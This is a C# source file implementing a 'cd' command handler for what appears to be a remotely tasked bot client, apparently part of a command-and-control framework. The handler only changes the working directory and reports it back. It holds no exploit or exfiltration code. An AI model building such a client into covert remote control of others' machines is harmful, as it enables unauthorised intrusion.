using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using System;
using System.IO;


namespace pattaya_project_client.Commands.Implements
{
    public class ChangeDirectory : BotCommand
    {
        public override string TaskName => "cd";

        public override BotTaskResult RunTask(BotTask task)
        {
            string path;
            var arguments = task.Arguments.Split(' ');


            if (arguments is null || arguments.Length == 0)
            {
                path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            }
            else
            {
                path = arguments[0];
            }

            Directory.SetCurrentDirectory(path);
            return new BotTaskResult
            {
                TaskId = task.TaskId,
                Result = "Changed Directory: " + Directory.GetCurrentDirectory()
            };
        }
    }
}
